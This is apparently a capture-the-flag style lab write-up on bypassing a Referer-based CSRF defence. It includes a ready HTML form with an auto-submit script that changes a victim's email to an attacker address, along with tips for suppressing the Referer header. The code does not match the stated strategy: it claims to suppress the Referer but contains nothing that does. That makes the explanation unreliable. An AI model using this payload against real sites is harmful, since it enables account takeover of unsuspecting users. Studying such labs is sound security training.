### ğŸ§ª Lab Summary

- The target site uses Referer validation to block CSRF.
- If the Referer header is present and from a different domain, the request is rejected.
- But if the Referer header is **absent**, the request is accepted.
- This allows an attacker to craft a CSRF exploit that **suppresses the Referer header**.

---

### ğŸ”¥ Exploit Strategy

1. **Capture the legitimate email change request** using Burp Suite.
2. **Verify behavior**:
   - With a foreign Referer â†’ request blocked.
   - With no Referer â†’ request accepted.
3. **Craft CSRF exploit** that suppresses the Referer header:
   ```html
   <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
     <input type="hidden" name="email" value="attacker@evil.com">
   </form>
   <script>
     document.forms[0].submit();
   </script>
   ```
4. **Host the exploit on your server** and deliver it to the victim.

ğŸ’¡ Bonus: You can suppress the Referer header more reliably by using `<iframe sandbox>` or `meta referrer` tricks, but in this lab, simply omitting it works.

---

### ğŸ§  Symbolic Mapping

| Header State | Symbolic Gate | Server Behavior |
|--------------|----------------|------------------|
| Valid Referer | Guarded mirror | Request accepted |
| Foreign Referer | Broken seal | Request blocked |
| No Referer | Blind passage | Request accepted |
